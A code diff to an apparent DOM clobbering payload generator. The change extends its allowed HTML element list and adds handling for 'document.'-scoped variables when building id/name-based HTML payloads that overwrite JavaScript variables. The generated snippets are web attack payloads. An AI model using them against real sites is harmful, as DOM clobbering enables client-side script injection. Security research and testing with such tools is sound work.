@@ -32,7 +32,8 @@
 
     <script>
         var initialize = false;
-        var ALLOWED_ELEMENTS = ["a", "form", "input", "iframe"];
+        // var ALLOWED_ELEMENTS = ["a", "form", "input", "iframe"];
+        const ALLOWED_ELEMENTS = ["a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio", "b", "base", "bdi", "bdo", "bgsound", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "data", "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset", "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "image", "img", "input", "ins", "kbd", "keygen", "label", "legend", "li", "link", "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", "nav", "nobr", "noembed", "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p", "param", "picture", "plaintext", "portal", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp", "script", "section", "select", "slot", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "xmp"];
 
         /**
          * Determine if it's possible to manipulate the variable through an HTML element attribute.
@@ -91,29 +92,37 @@
                 const [first, second] = variableName.split(".");
 
                 for (const elem of ALLOWED_ELEMENTS) {
+                    if (documentScope && !SUPPORTS_NAME_ATTR.includes(elem)) {
+                        continue;
+                    }
+
                     if (isEnding(elem, second)) {
-                        payloads.push(`<${elem} id="${first}" ${second}="${variableValue}"></${elem}>`);
+                        if (!documentScope) payloads.push(`<${elem} id="${first}" ${second}="${variableValue}"></${elem}>`);
                         if (SUPPORTS_NAME_ATTR.includes(elem)) {
-                            payloads.push(`<${elem} name="${first}" ${second}="${variableValue}"></${elem}>`);
+                            if (documentScope && elem !== "iframe")
+                                payloads.push(`<${elem} name="${first}" ${second}="${variableValue}"></${elem}>`);
                         }
                     }
                 }
 
-                if (!isValidURI(variableValue)) {
-                    variableValue = "a:" + variableValue;
+                if (!documentScope) {
+                    if (!isValidURI(variableValue)) {
+                        variableValue = "a:" + variableValue;
+                    }
+                    payloads.push(`<a id="${first}"></a><a id="${first}" name="${second}" href="${variableValue}"></a>`);
                 }
-                payloads.push(`<a id="${first}"></a><a id="${first}" name="${second}" href="${variableValue}"></a>`);
+
             } else if (depth === 3) {
                 const [first, second, third] = variableName.split(".");
 
-                if (ALLOWED_ELEMENTS.includes("form")) {
-                    if (isEnding("form", third)) {
-                        payloads.push(`<form id="${first}" name="${second}" ${third}="${variableValue}"></form>\n<form id="${first}">`);
-                    } else if (ALLOWED_ELEMENTS.includes("input")) {
+                if (ALLOWED_ELEMENTS.includes("form") && ALLOWED_ELEMENTS.includes("input")) {
+                    if (documentScope) {
+                        setNote('Unable to set the value of this variable, retry without "document." or by using "window." instead.');
+                    } else {
+                        setNote('The variable will be defined, but the variable value will be inside the ".value" property.');
                         payloads.push(`<form id="${first}" name="${second}">\n\t<input id="${third}" value="${variableValue}">\n</form>\n<form id="${first}">`);
                     }
                 }
-
             }
 
             return payloads;
